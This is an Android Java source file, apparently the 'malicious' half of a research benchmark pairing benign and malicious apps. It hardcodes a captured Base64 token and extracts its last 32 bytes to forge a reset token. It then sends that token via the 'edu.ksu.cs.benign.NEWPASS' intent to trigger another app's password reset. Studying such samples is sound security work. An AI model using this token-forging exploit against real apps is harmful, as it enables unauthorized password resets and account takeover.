package edu.ksu.cs.malicious;

import android.content.Intent;
import android.os.Bundle;
import android.support.v7.app.AppCompatActivity;
import android.util.Base64;
import android.view.View;
import android.widget.Button;
import android.widget.EditText;

public class MainActivity extends AppCompatActivity {

    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        setContentView(R.layout.activity_main);
    }

    @Override
    protected void onResume() {
        super.onResume();
        final EditText tokenW = (EditText) findViewById(R.id.malicious_token);
        final String t = "DoA/0y0QJIOBsTzLc5S/wg79FMgaKfoVpymt5cUSQ8K3pnjTK2GVnIYMDKTIlT+y";
        tokenW.setText(t);
        final Button button = (Button) findViewById(R.id.reset_pwd_malicious);
        button.setOnClickListener(new View.OnClickListener() {
            @Override
            public void onClick(View v) {
                final String newToken = recreateToken(tokenW.getText().toString());
                Intent intent = new Intent("edu.ksu.cs.benign.NEWPASS");
                intent.putExtra("token", newToken);
                startActivity(intent);
            }
        });
    }

    private String recreateToken(String encodedToken) {
        byte[] rawToken = Base64.decode(encodedToken, Base64.DEFAULT);
        byte[] newToken = new byte[32];
        int k = 0;
        for (int i = rawToken.length - 32; i < rawToken.length; i++) {
            newToken[k] = rawToken[i];
            k++;
        }
        return Base64.encodeToString(newToken, Base64.DEFAULT);
    }
}
